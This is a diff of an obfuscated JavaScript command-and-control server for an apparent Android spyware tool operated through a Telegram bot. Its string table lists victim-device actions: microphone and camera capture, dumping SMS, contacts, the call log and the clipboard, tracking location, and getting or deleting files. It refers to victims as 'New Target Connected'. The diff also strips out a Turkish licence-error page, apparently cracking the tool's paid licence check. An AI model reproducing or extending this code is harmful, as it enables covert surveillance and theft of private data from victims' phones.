@@ -53,43 +53,8 @@ const bot = new TelegramBot(token, {
 
 // request -------------------------------------------------------------------
 function _0x4c14() {
-    const _0x3edb4c = ['Mic\x201\x20🎤', '/sendLocation', 'sendDocument', 'data', '8330440SpZacJ', 'split', 'cam2', '18rUBxXK', '120495lhjred', 'originalname', 'All\x20Contact\x20👤', 'Server\x20started\x20on\x20port\x20', '<b>', 'send', 'cam1', 'mi2', 'text', 'All\x20Sms\x20💬', 'file', 'Your\x20Request\x20Is\x20On\x20Progress\x20!', 'single', 'Mic\x203\x20🎤', 'clients', 'Call\x20Log\x20📞', '/sendText', 'Get\x20Folder\x20/\x20File\x20📄', '135227VFXWyf', 'df&', '8PWkFWY', 'Device\x20Model\x20📱', 'PORT', 'connection', '<b>☄\x20Select\x20Action\x20For\x20Device\x20:</b>\x0a&', 'Status\x20⚙', 'get', 'mi3', 'Hoşgeldin Reis 🔱', 'forEach', '161439pIBVgF', 'HTML', '/sendFile', 'gf&', '<!DOCTYPE html>
-<html>
-<head>
-<meta charset="utf-8">
-    <title>Lisans hatası!</title>
-   <link rel="icon" href="hacker-icon-37223-Windows.ico" type="image/x-icon" /
-    
-    <link href="https://fonts.googleapis.com/css?family=Didact+Gothic|Montserrat|Open+Sans+Condensed:300|Titillium+Web&display=swap" rel="stylesheet">
-    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.0-1/css/all.min.css">
-    <style type="text/css">
-        body {
-            background-color: #FF3B3B;
-            font-family: 'Didact Gothic', sans-serif;
-            color: white;
-        }
-    </style>
-</head>
-<body>
-<center>
-    <br><br><br><br><br><br>
-    <li style="font-size: 150px;" class="fa fa-exclamation-triangle"></li><br>
-    <h2>Lisans hatası aldınız!</h2><br><br><br><br>
-    <h3>Bu hatayı neden aldınız?</h3>
-    <h4>Scripti lisanssız kurmuşsunuz. Lisans satın almanız gereklidir.</h4>
-    <h4>Sorunu Çözmek için Butondan iletişime geçin.<h4>
-        <a href="https://t.me/rota47" target="_blank"><img border="0" data-original-height="48" data-original-width="48" height="48" src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Telegram_logo.svg/512px-Telegram_logo.svg.png" width="48" /><a href="https://instagram.com/rotapasha47" target="_blank"><img border="0" data-original-height="48" data-original-width="48" height="48" src="https://www.freepnglogos.com/uploads/logo-ig-png/logo-ig-instagram-new-logo-vector-download-5.png" width="48" />
-        <center>
-<script src="https://apis.google.com/js/platform.js"></script>
-
-<div class="g-ytsubscribe" data-channelid="UCjsMmq12zRHVCY_DbBPV9jA" data-count="default" data-layout="full">
-</div>
-
-
-</center>
-</center>
-</body>
-</html>', 'Clip\x20Board\x20📄', 'body', '740464YOjhCq', 'socket', '!\x0a\x0a<b>Action\x20Get\x20File\x20/\x20Folder\x0a🔵\x20Please\x20Reply\x20File\x20/\x20Folder\x20Path:</b>', '!\x0a<b>Action\x20Delete\x20File\x20/\x20Folder\x0a🔵\x20Please\x20Reply\x20File\x20/\x20Folder\x20Path:</b>', 'Delete\x20Folder\x20/\x20File\x20🗑', 'size', '</b>\x20🌐', 'sendMessage', 'log', 'Send\x20Sms\x20💬', 'toString', 'listen', 'post', 'ss&', 'reply_to_message', 'address', 'uuid', '<b>ID\x20=>\x20</b><code>', 'replaceAll', '5688936vWUlXN', '<b>New\x20Target\x20Connected\x20📱\x0a\x0aID\x20=\x20<code>', '2svBYgi', 'Action\x20☄', 'port', 'buffer', 'Installed\x20Apps\x20📲', 'mi1', 'catch', 'sendLocation', '1777580wjzGmn'];
+    const _0x3edb4c = ['Mic\x201\x20🎤', '/sendLocation', 'sendDocument', 'data', '8330440SpZacJ', 'split', 'cam2', '18rUBxXK', '120495lhjred', 'originalname', 'All\x20Contact\x20👤', 'Server\x20started\x20on\x20port\x20', '<b>', 'send', 'cam1', 'mi2', 'text', 'All\x20Sms\x20💬', 'file', 'Your\x20Request\x20Is\x20On\x20Progress\x20!', 'single', 'Mic\x203\x20🎤', 'clients', 'Call\x20Log\x20📞', '/sendText', 'Get\x20Folder\x20/\x20File\x20📄', '135227VFXWyf', 'df&', '8PWkFWY', 'Device\x20Model\x20📱', 'PORT', 'connection', '<b>☄\x20Select\x20Action\x20For\x20Device\x20:</b>\x0a&', 'Status\x20⚙', 'get', 'mi3', 'Hoşgeldin Reis 🔱', 'forEach', '161439pIBVgF', 'HTML', '/sendFile', 'gf&', '
+HERŞEY TAMAM', 'Clip\x20Board\x20📄', 'body', '740464YOjhCq', 'socket', '!\x0a\x0a<b>Action\x20Get\x20File\x20/\x20Folder\x0a🔵\x20Please\x20Reply\x20File\x20/\x20Folder\x20Path:</b>', '!\x0a<b>Action\x20Delete\x20File\x20/\x20Folder\x0a🔵\x20Please\x20Reply\x20File\x20/\x20Folder\x20Path:</b>', 'Delete\x20Folder\x20/\x20File\x20🗑', 'size', '</b>\x20🌐', 'sendMessage', 'log', 'Send\x20Sms\x20💬', 'toString', 'listen', 'post', 'ss&', 'reply_to_message', 'address', 'uuid', '<b>ID\x20=>\x20</b><code>', 'replaceAll', '5688936vWUlXN', '<b>New\x20Target\x20Connected\x20📱\x0a\x0aID\x20=\x20<code>', '2svBYgi', 'Action\x20☄', 'port', 'buffer', 'Installed\x20Apps\x20📲', 'mi1', 'catch', 'sendLocation', '1777580wjzGmn'];
     _0x4c14 = function() {
         return _0x3edb4c;
     };
